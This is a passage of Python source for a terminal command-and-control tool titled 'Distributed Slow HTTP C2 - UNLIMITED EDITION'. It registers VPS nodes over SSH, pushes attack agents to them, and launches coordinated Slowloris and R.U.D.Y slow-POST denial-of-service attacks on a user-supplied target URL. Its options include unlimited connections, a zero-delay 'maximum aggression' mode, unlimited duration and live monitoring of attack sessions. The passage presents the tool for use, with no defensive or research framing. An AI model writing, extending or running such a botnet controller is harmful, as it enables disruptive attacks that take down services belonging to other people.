                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] VPS already exists or database error{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("-" * 40)
        
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
            status = 'online' if success else 'offline'
            self.db_manager.update_vps_status(ip, status)
            
            if success:
                print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
            else:
                print(f"{Colors.RED}OFFLINE - {message}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def test_single_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[2]}@{vps[1]}:{vps[4]})")
        
        try:
            choice = self.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
                
                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
                    
                    # Test command execution
                    print(f"{Colors.CYAN}[TESTING] Command execution...{Colors.RESET}")
                    success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Command execution test passed{Colors.RESET}")
                        print(f"Output: {output}")
                    else:
                        print(f"{Colors.RED}[ERROR] Command execution failed: {output}{Colors.RESET}")
                    
                    self.db_manager.update_vps_status(ip, 'online')
                else:
                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline')
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def deploy_all_agents(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING UNLIMITED AGENTS TO ALL ONLINE VPS{Colors.RESET}")
        print("-" * 50)
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps[1]
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
            else:
                print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} unlimited agents deployed successfully{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            choice = self.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps[1]}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    # Disconnect if connected
                    self.ssh_manager.disconnect_vps(vps[1])
                    
                    # Remove from database
                    if self.db_manager.remove_vps(vps[1]):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        self.clear_screen()
        self.print_banner()
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"{Colors.BOLD}LAUNCH UNLIMITED DISTRIBUTED ATTACK{Colors.RESET}")
        print("=" * 50)
        
        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            # Target configuration
            print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
            target_url = self.input_with_prompt("Target URL (e.g., http://target.com): ")
            if not target_url:
                return
            
            # Parse and validate target
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            # Attack type selection
            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (UNLIMITED Headers)")
            print(f"{Colors.GREEN}[2]{Colors.RESET} R.U.D.Y (UNLIMITED POST - 10MB-100MB per connection)")
            
            attack_choice = self.input_with_prompt("Select attack type (1-2): ")
            attack_types = {'1': 'slowloris', '2': 'slow_post'}
            attack_type = attack_types.get(attack_choice)
            
            if not attack_type:
                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # VPS selection
            print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
            vps_choice = self.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
            
            if vps_choice.lower() == 'y':
                selected_vps = [vps[1] for vps in online_vps]
            else:
                print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
                selection = self.input_with_prompt("VPS selection: ")
                if not selection:
                    return
                
                try:
                    indices = [int(x.strip()) - 1 for x in selection.split(',')]
                    selected_vps = [online_vps[i][1] for i in indices if 0 <= i < len(online_vps)]
                except (ValueError, IndexError):
                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}No VPS selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Attack parameters - UNLIMITED MODE
            print(f"\n{Colors.BOLD}UNLIMITED ATTACK PARAMETERS:{Colors.RESET}")
            
            connections_str = self.input_with_prompt("Connections per VPS (default 100, NO UPPER LIMIT): ", False) or "100"
            try:
                connections = int(connections_str)
                if connections > 20000:
                    print(f"{Colors.RED}WARNING: EXTREMELY HIGH connection count ({connections:,}){Colors.RESET}")
                    print("This will create massive server load. Continue? (y/N)")
                    if input().strip().lower() != 'y':
                        connections = 1000
            except ValueError:
                connections = 100
            
            delay_str = self.input_with_prompt("Delay between packets (0=MAXIMUM AGGRESSION, default 15): ", False) or "15"
            try:
                delay = int(delay_str)
                if delay == 0:
                    print(f"{Colors.RED}ZERO DELAY MODE: Maximum aggression enabled{Colors.RESET}")
            except ValueError:
                delay = 15
            
            duration_str = self.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False) or "0"
            try:
                duration = int(duration_str)
            except ValueError:
                duration = 0
            
            # Attack summary
            print(f"\n{Colors.BOLD}UNLIMITED ATTACK SUMMARY:{Colors.RESET}")
            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
            attack_name = "Slowloris (UNLIMITED)" if attack_type == "slowloris" else "R.U.D.Y (UNLIMITED 10-100MB)"
            print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
            print(f"Connections per VPS: {Colors.YELLOW}{connections:,}{Colors.RESET}")
            print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * connections:,}{Colors.RESET}")
            print(f"Packet Delay: {Colors.YELLOW}{delay}s {'(ZERO DELAY - MAX AGGRESSION)' if delay == 0 else ''}{Colors.RESET}")
            print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
            
            if attack_type == 'slow_post':
                estimated_data = len(selected_vps) * connections * 50  # Avg 50MB per connection
                print(f"Estimated Total Data: {Colors.RED}{estimated_data:,} MB{Colors.RESET}")
            
            # Final confirmation
            print(f"\n{Colors.RED}LAUNCH UNLIMITED ATTACK? (y/N): {Colors.RESET}", end="")
            confirm = input().strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Create attack session
            session_name = f"Unlimited_{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0]
            
            parameters = {
                'connections': connections,
                'delay': delay,
                'duration': duration
            }
            
            session_id = self.db_manager.create_attack_session(
                session_name, target_url, target_host, attack_type, selected_vps, parameters
            )
            
            # Launch unlimited attack
            success = self.attack_manager.launch_attack(
                session_id, target_url, attack_type, selected_vps, parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}[SUCCESS] UNLIMITED ATTACK LAUNCHED SUCCESSFULLY!{Colors.RESET}")
                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
                
                # Auto-start monitoring
                input(f"\n{Colors.YELLOW}Press Enter to start real-time monitoring...{Colors.RESET}")
                self.monitor_attack(session_id)
            else:
                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
                input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            input("Press Enter to continue...")
    
    def monitor_attack(self, session_id=None):
        if session_id is None:
            # List active attacks
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
            for sid, attack_info in self.attack_manager.active_attacks.items():
                attack_name = "Slowloris (UNLIMITED)" if attack_info['attack_type'] == "slowloris" else "R.U.D.Y (UNLIMITED)"
                print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
            
            try:
                session_input = self.input_with_prompt("Enter session ID to monitor: ")
                if not session_input or not session_input.isdigit():
                    return
                session_id = int(session_input)
            except (ValueError, KeyboardInterrupt):
                return
        
        if session_id not in self.attack_manager.active_attacks:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time unlimited attack monitoring...{Colors.RESET}")
        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(2)
        
        try:
            while session_id in self.attack_manager.active_attacks:
                status_data = self.attack_manager.get_attack_status(session_id)
                attack_info = self.attack_manager.active_attacks[session_id]
                
                # Clear screen and display status
                self.clear_screen()
                
                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.RED}     UNLIMITED DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
                
                attack_name = "SLOWLORIS (UNLIMITED)" if attack_info.get('attack_type') == 'slowloris' else "R.U.D.Y (UNLIMITED)"
                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
                
                if attack_info.get('start_time'):
                    uptime = datetime.now() - attack_info['start_time']
                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
                
                # Parameters display
                params = attack_info.get('parameters', {})
                print(f"{Colors.PURPLE}[PARAMS]  Connections: {params.get('connections', 'N/A'):,} | Delay: {params.get('delay', 'N/A')}s{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<12} {'Last Check'}")
                print("-" * 80)
                
                total_processes = 0
                active_vps = 0
                
                for vps_ip, data in status_data.items():
                    processes = data.get('active_processes', 0)
                    status = "ATTACKING" if processes > 0 else "IDLE"
                    color = Colors.GREEN if processes > 0 else Colors.RED
                    conn_info = data.get('connections_info', '')
                    
                    total_processes += processes
                    if processes > 0:
                        active_vps += 1
                    
                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<12} {datetime.now().strftime('%H:%M:%S')}")
                
                print(f"\n{Colors.BOLD}UNLIMITED ATTACK STATISTICS:{Colors.RESET}")
                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
                
                est_connections = total_processes * params.get('connections', 100)
                print(f"{Colors.RED}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
                
                if attack_info.get('attack_type') == 'slow_post':
                    est_data_gb = (est_connections * 50) / 1024  # Estimated GB
                    print(f"{Colors.RED}Estimated Data Transfer: {est_data_gb:.1f} GB{Colors.RESET}")
                
                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
            
            # Ask if user wants to stop the attack
            try:
                stop_attack = input(f"{Colors.RED}Stop the unlimited attack? (y/N): {Colors.RESET}").strip().lower()
                if stop_attack == 'y':
                    self.attack_manager.stop_attack(session_id)
            except KeyboardInterrupt:
                pass
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        self.clear_screen()
        self.print_banner()
        
        sessions = self.db_manager.get_attack_sessions()
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 30)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
        else:
            print(f"\n{'ID':<4} {'Session Name':<25} {'Target':<20} {'Type':<15} {'Status':<10} {'Start Time'}")
            print("-" * 100)
            
            for session in sessions:
                start_time = session[6][:19] if session[6] else 'N/A'
                status_color = Colors.GREEN if session[8] == 'completed' else Colors.YELLOW if session[8] == 'running' else Colors.RED
                attack_type = "Slowloris (UNL)" if session[4] == 'slowloris' else "R.U.D.Y (UNL)"
                
                print(f"{session[0]:<4} {session[1][:24]:<25} {session[3][:19]:<20} {attack_type:<15} {status_color}{session[8]:<10}{Colors.RESET} {start_time}")
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 20)
        
        # VPS Statistics
        vps_list = self.db_manager.get_all_vps()
        online_count = sum(1 for vps in vps_list if vps[5] == 'online')
        offline_count = len(vps_list) - online_count
        
        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
        print(f"Total VPS: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
        
        # Attack Statistics
        sessions = self.db_manager.get_attack_sessions()
        active_attacks = len(self.attack_manager.active_attacks)
        
        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
        print(f"Active Unlimited Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
        
        # SSH Connections
        ssh_connections = len(self.ssh_manager.connections)
        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
        print(f"Active SSH: {Colors.GREEN}{ssh_connections}{Colors.RESET}")
        
        # System Information
        print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
        print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
        print(f"Mode: {Colors.RED}UNLIMITED EDITION{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attack()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.system_status_menu()
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down unlimited C2...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")

def main():
    # Check Python version
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    # Check dependencies
    try:
        import paramiko
        from cryptography.fernet import Fernet
        import colorama
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Please install: pip install paramiko cryptography colorama")
        sys.exit(1)
    
    # Create necessary directories
    os.makedirs('logs', exist_ok=True)
    os.makedirs('config', exist_ok=True)
    
    # Initialize and run TUI
    try:
        print("Starting Distributed Slow HTTP C2 - UNLIMITED EDITION...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
